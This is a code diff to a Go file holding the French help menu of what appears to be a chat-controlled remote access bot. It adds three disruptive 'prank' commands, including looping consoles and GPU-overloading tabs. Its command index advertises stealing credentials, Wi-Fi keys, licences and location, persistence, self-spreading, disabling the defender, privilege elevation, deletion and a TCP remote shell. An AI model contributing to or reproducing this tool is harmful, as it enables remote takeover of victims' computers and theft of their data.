@@ -102,6 +102,9 @@ var helpSections = map[string]string{
 		"!prank jiggle                agite la souris\n" +
 		"!prank keyboard              bloque clavier et souris 10 s\n" +
 		"!prank flood 20 Bonjour      ouvre 20 consoles avec le texte\n" +
+		"!prank terminals 10          consoles qui se relancent en boucle\n" +
+		"!prank vsbm 8               ouvre 8 onglets 3D (fait ramer le GPU)\n" +
+		"!prank revert                remet barre des taches, souris, consoles\n" +
 		"!prank stop                  ferme les consoles du prank\n" +
 		"```",
 }
@@ -114,7 +117,7 @@ const helpIndex = "**Commandes** — `!help <section>`\n" +
 	"steal      steal, stealf, ecole, wifi, licence, localisation, sysinfo\n" +
 	"systeme    persist, spread, defender, elevate, power, shutdown, killall, delete\n" +
 	"reseau     shell_tcp\n" +
-	"fun        prank (18 effets)\n" +
+	"fun        prank (21 effets)\n" +
 	"```\n" +
 	"Chaque commande a un exemple : `!help fichiers`, `!help fun`…"
 
